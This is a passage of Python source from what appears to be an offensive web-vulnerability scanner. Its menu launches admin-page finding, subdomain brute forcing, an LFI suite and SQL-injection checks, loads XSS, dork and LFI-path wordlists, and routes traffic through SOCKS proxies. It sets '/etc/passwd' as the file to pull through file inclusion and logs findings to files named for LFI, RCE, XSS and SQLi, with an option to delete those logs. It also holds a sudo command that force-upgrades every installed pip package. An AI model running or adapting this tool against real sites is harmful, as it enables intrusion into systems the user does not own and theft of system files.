        findadmin = subprocess.Popen('python3.6 ' + pwd + "/modules/adminfinder.py -w lists/adminlist.txt -u " + str(afsite),
                                     shell=True)
        findadmin.communicate()
        subprocess._cleanup()

    elif chce == '3':
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        ftpcrawl = subprocess.Popen('python3.6 ' + pwd + "/modules/toxin.py -i " , shell=True)
        ftpcrawl.communicate()
        subprocess._cleanup()

    elif chce == '4':
        target_site = input("Enter the site eg target.com: ")
        print("[1] Normal Scan suitable for average sites")
        print("[2] Scan All The Things, if its on the internet, we'll find it... Go cook a cake, this will take a LONG time")
        allthethings = input(":")
        att = ""
        if allthethings == '1':
            att = str(" ")
        elif allthethings == '2':
            att = str("att")
        print(B)
        pwd = os.path.dirname(str(os.path.realpath(__file__)))
        dnsbrute = subprocess.Popen(
            'python3.6 ' + pwd + "/modules/dnsbrute.py -w lists/subdomains -u " + str(target_site) + att + " -t 200"
            , shell=True)
        dnsbrute.communicate()
        subprocess._cleanup()

    elif chce == '5':
        print(W + "")
        enable_proxy()

    elif chce == '0':
        print(R + "\n Exiting ...")
        print(W)
        sys.exit(0)

    elif chce == '6':
        cloud()
        fmenu()

    elif chce == '7':
        print(W + "")
        os.system('clear')
        logo()
        print("[1] Skip to custom SQLi list checking")
        print("[2] Launch LFI Suite")
        print("[3] Print contents of Log files")
        print("[4] Flush Cache and Delete Logs *Warning will erase Toxin Logs/Saves aswell* ")
        print("[5] Perform forced update of ALL installed Python packages and dependancies on system")
        print("[0] Return to main menu")
        chce2 = input(":")
        if chce2 == '1':
            os.system('clear')
            customSelected = True
            injtest()
        elif chce2 == '2':
            path = os.path.dirname(str(os.path.realpath(__file__)))
            lfisuite = subprocess.Popen('python3.6 ' + path + "/lfisuite.py ", shell=True)
            lfisuite.communicate()
            subprocess._cleanup()
        elif chce2 == '3':
            for filename in glob("*.txt"):
                print(filename)
            print("Dumping output of Cache complete, Sleeping for 5 seconds")
            time.sleep(5)
        elif chce2 == '4':
            try:
                print("Checking if Cache or Logs even exist!")
                time.sleep(1)
                for filename in glob("*.txt"):
                    os.remove(filename)
                    print("Cache has been cleared, all logs have been deleted")
                    time.sleep(2)
            except Exception:
                print("No Cache or Log Files to delete!")
        elif chce2 == '5':
            import pip
            from subprocess import call
            import time
            path = os.path.dirname(str(os.path.realpath(__file__)))
            print("Updating Python Module First: Cloudbuster files. Please wait.")
            time.sleep(2)
            cloudupdate = subprocess.Popen('python3.6' + path + "/lists/update.py ", shell=True)
            cloudupdate.communicate()
            subprocess._cleanup()
            print("Cloudbuster features updated!, Moving onto Python Modules and Dependencies...")
            time.sleep(4)
            sys.stdout.flush()
            print(
                "This will install the missing modules and upgrade them to current versions then update your Python3.6 entirely")
            print("You will have 10 seconds to cancel this action before the system begins")
            print("sudo is required as these changes are systemwide upgrades/updates for Python")
            time.sleep(10)
            call("sudo pip3.6 freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 sudo pip3.6 install -U",
                 shell=True)
            pass
        elif chce2 == '0':
            fmenu()




d0rk = [line.strip() for line in open("lists/d0rks", 'r', encoding='utf-8')]
header = [line.strip() for line in open("lists/header", 'r', encoding='utf-8')]
xsses = [line.strip() for line in open("lists/xsses", 'r', encoding='utf-8')]
lfis = [line.strip() for line in open("lists/pathtotest_huge.txt", 'r', encoding='utf-8')]
tables = [line.strip() for line in open("lists/tables", 'r', encoding='utf-8')]
columns = [line.strip() for line in open("lists/columns", 'r', encoding='utf-8')]
search_Ignore = str(line.strip() for line in open("lists/search_ignore", 'r', encoding='utf-8'))
random.shuffle(d0rk)
random.shuffle(header)
random.shuffle(lfis)


# noinspection PyBroadException
def enable_proxy():
    global ProxyEnabled
    try:
        requiresID = bool(
            input("Requires Username/Password? Leave Blank if not required, otherwise type y/yes/true/True  :"))
        print(requiresID)
        print("Please select Proxy Type - Options = socks4, socks5  : ")
        proxytype = input(str())
        print(" Please enter Proxy IP address - ie. 127.0.0.66  :")
        proxyip = input(int)
        print(" Please enter Proxy Port - ie. 1076  :")
        proxyport = input(int)
        if proxytype == str("socks4"):
            if requiresID:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport,
                                          username=input("Proxy Account Username  :"),
                                          password=input("Proxy Account Password  :"))
                    socks.socket = socks.socksocket
                    print(" Socks 4 Proxy Support Enabled")
                    ProxyEnabled = str("True ")
                except Exception:
                    pass
            else:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, proxyip, proxyport)
                    socks.socket = socks.socksocket
                    print(" Socks 4 Proxy Support Enabled")
                    ProxyEnabled = str("True ")
                except Exception:
                    pass
        elif proxytype == str("socks5"):
            if requiresID:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport,
                                          username=input("Proxy Account Username  :"),
                                          password=input("Proxy Account Password  :"))
                    print(" Socks 5 Proxy Support Enabled")
                    socks.socket = socks.socksocket
                    ProxyEnabled = str("True ")
                except Exception:
                    pass
            else:
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport)
                    socks.socket = socks.socksocket
                    print(" Socks 5 Proxy Support Enabled")
                    ProxyEnabled = str("True ")
                except Exception:
                    pass
    except Exception:
        pass


try:
    codecs.lookup('mbcs')
except LookupError:
    ascii_encoding = codecs.lookup('latin-1')

    def mbcs_bypass(name, encoding=ascii_encoding):
        if name == "mbcs":
            return encoding

    codecs.register(mbcs_bypass)

# Colours
W = "\033[0m"
R = "\033[31m"
G = "\033[32m"
O = "\033[33m"
B = "\033[34m"


def cache_Check():
    global cachestatus
    my_file1 = Path("v3n0m-lfi.txt")
    my_file2 = Path("v3n0m-rce.txt")
    my_file3 = Path("v3n0m-xss.txt")
    my_file5 = Path("v3n0m-sqli.txt")
    my_file4 = Path("IPLogList.txt")
    if my_file1.is_file() or my_file2.is_file() or my_file3.is_file() or my_file4.is_file() or my_file5.is_file():
        cachestatus = "** Cache NOT Empty**"
    else:
        cachestatus = "Logs Cache is Empty "


subprocess.call("clear", shell=True)
arg_end = "--"
arg_eva = "+"
colMax = 60  # Change this at your will
endsub = 1
gets = 0
timeout = 7
file = "/etc/passwd"
ProxyEnabled = False
menu = True
current_version = str("419  ")
while True:
    fmenu()




